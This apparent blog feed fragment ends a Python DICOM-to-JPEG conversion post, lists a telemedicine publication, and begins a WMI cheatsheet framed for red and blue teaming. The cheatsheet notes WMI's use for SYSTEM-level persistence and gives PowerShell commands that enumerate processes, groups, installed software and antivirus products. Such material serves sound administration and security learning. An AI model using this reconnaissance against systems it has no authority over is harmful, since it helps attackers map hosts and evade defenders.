&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ds&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instance&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Getting instance metadata to categorize images&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">patient_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PatientID&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">study_date&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">StudyDate&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">series_number&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SeriesNumber&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">instance_number&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">InstanceNumber&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Getting instance pixel data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pixel_array&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Applying color palette (if available)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">apply_color_lut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Applying modality LUT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hu&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">apply_modality_lut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Applying VOI LUT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">apply_voi_lut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hu&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Rescaling pixel data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">new_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">astype&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">float&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">scaled_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">maximum&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">new_image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">new_image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">max&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mf">255.0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">scaled_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">np&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">uint8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">scaled_image&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">final_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fromarray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">scaled_image&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Exporting image in JPEG format&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">IMAGE_PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">OUTPUT_PATH&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sep&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">patient_id&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sep&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">study_date&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sep&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">series_number&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">makedirs&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_PATH&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">exist_ok&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">OUTPUT_IMAGE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">IMAGE_PATH&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sep&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">instance_number&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">.jpg&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">final_image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">OUTPUT_IMAGE&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.dicomstandard.org/" target="_blank" rel="noopener">Digital Image and Communications in Medicine&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://pydicom.github.io/pydicom/stable/" target="_blank" rel="noopener">pydicom documentation&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://medium.com/analytics-vidhya/dicom-and-deep-learning-63373e99d79a" target="_blank" rel="noopener">Extract DICOM Images Only for Deep Learning | by Nawaf Alageel | Analytics Vidhya | Medium&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://mscipio.github.io/post/read_dicom_files_in_python/" target="_blank" rel="noopener">How to read DICOM files into Python | MICHELE SCIPIONI (mscipio.github.io)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://pycad.co/how-to-convert-a-dicom-image-into-jpg-or-png/" target="_blank" rel="noopener">How To Convert a DICOM Image Into JPG or PNG - PYCAD&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Markerless radio frequency indoor monitoring for telemedicine: gait analysis, indoor positioning, fall detection, tremor analysis, vital signs and sleep monitoring</title><link>https://www.peco602.com/publication/0090-markerless-rf-monitoring-telemedicine/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0090-markerless-rf-monitoring-telemedicine/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>Windows Management Instrumentation cheatsheet</title><link>https://www.peco602.com/post/0080-wmi-cheatsheet/</link><pubDate>Thu, 29 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0080-wmi-cheatsheet/</guid><description>&lt;p>Windows Management Instrumentation (WMI) is Microsoft&amp;rsquo;s implementation of Common Information Model (CIM) and Web-Based Enterprise Management (WBEM). WMI provides a unique interface for applications/scripts to manage a local or remote network or computer.&lt;/p>
&lt;p>WMI can be used for Red/Blue Teaming because:&lt;/p>
&lt;ul>
&lt;li>it is enabled on all Windows systems by default;&lt;/li>
&lt;li>it really mixes well with existing network traffic;&lt;/li>
&lt;li>it provides execution and persistence with SYSTEM privileges;&lt;/li>
&lt;li>it is often neglected by defenders.&lt;/li>
&lt;/ul>
&lt;p>By default, the WMI service – Winmgmt is running and listening on port 135. DCOM connections are established on port 135, while subsequent data exchanged on port dictated by &lt;code>HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\Internet – Ports (REG_MULTI_SZ)&lt;/code> configurable via &lt;code>DCOMCNFG.exe&lt;/code>.&lt;/p>
&lt;h2 id="wmi-basics">WMI Basics&lt;/h2>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img src="./wmi_architecture.png" alt="WMI Architecture" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="wmi-components">WMI Components&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Component&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Managed Objects&lt;/td>
&lt;td>Component being managed by WMI (e.g. process, service, operating system).&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Managed Objects Format (MOF) files&lt;/td>
&lt;td>Used to define WMI namespaces, classes, providers, etc.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Classes&lt;/td>
&lt;td>Represent items in WMI (e.g. process, hardware, service)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Repository&lt;/td>
&lt;td>The database used to store the static data (definitions) of classes.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Namespaces&lt;/td>
&lt;td>Created by providers, they are used to divide classes logically (e.g. root\cimv2, root\default, root\security).&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Providers&lt;/td>
&lt;td>Just like a driver, works as a bridge between a managed object and WMI. They generally exist for every MOF file.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Consumers&lt;/td>
&lt;td>Applications or scripts which can be used to interact with WMI classes (e.g. powershell, wmic).&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="exploring-commands">Exploring commands&lt;/h3>
&lt;h4 id="wmi-commands---powershell-v2">WMI Commands - PowerShell v2&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Command&lt;/span> &lt;span class="n">-CommandType&lt;/span> &lt;span class="n">Cmdlet&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">wmi&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Register-WmiEvent&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Remove-WmiObject&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-WmiInstance&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="cim-commands---powershell-v3">CIM Commands - PowerShell v3&lt;/h4>
&lt;p>CIM commands use WS-MAN so they can be used also against boxes where WMI is blocked but WS-MAN (WinRM) is enabled (even if the target has PowerShell version 2). They can be used also against non-Windows boxes.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Command&lt;/span> &lt;span class="n">-CommandType&lt;/span> &lt;span class="n">Cmdlet&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">cim&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimAssociatedInstance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimSession&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-CimMethod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-CimInstance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-CimSession&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-CimSessionOption&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Register-CimIndicationEvent&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Remove-CimInstance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Remove-CimSession&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-CimInstance&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="wmi-and-cim-commands-relations">WMI and CIM commands relations&lt;/h4>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>WMI&lt;/th>
&lt;th>CIM&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Get-WmiObject&lt;/td>
&lt;td>Get-CmiInstance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Get-WmiObject -List&lt;/td>
&lt;td>Get-CmiClass&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Invoke-WmiMethod&lt;/td>
&lt;td>Invoke-CimMethod&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Register-WmiEvent&lt;/td>
&lt;td>Register-CimIndicationEvent&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Remove-WmiObject&lt;/td>
&lt;td>Remove-CimInstance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Set-WmiInstance&lt;/td>
&lt;td>Set-CimInstance&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="exploring-namespaces-within-root-namespace">Exploring namespaces within root namespace&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="s2">&amp;#34;__Namespace&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="s2">&amp;#34;__Namespace&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="s2">&amp;#34;__Namespace&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Recursively list nested namespaces&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiNamespace&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="exploring-classes-and-objects">Exploring classes and objects&lt;/h3>
&lt;p>Once we have a namespace, we can explore its classes. Classes represent items in WMI like process, hardware, service, etc.&lt;/p>
&lt;h4 id="get-classes">Get classes&lt;/h4>
&lt;p>If not specified, root/cim2 is the default namespace. Use &lt;code>-List&lt;/code> parameter for &lt;code>Get-WmiObject&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cimv2&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">bios&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">bios&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cimv2&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">bios&lt;/span>&lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">bios&lt;/span>&lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-QualifierName&lt;/span> &lt;span class="n">dynamic&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="get-instances-of-a-class-objects">Get instances of a class (objects)&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_BIOS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_BIOS&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="filtering-objects">Filtering objects&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s2">&amp;#34;Name = &amp;#39;explorer.exe&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s2">&amp;#34;Name = &amp;#39;explorer.exe&amp;#39;&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl &lt;/span>&lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Name&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;explorer.exe&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Name&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;explorer.exe&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;select * from Win32_Process where Name = &amp;#39;explorer.exe&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;select * from Win32_Process where Name = &amp;#39;explorer.exe&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="example-of-wmi-usage">Example of WMI usage&lt;/h3>
&lt;p>Get computer name, domain and local groups:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Explore namespaces to find the correct one&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="s2">&amp;#34;__Namespace&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Computer name and domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_ComputerSystem&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Local groups&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Group&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List installed software:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Product&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get installed antivirus:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/SecurityCenter2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/SecurityCenter2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">AntiVirusProduct&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
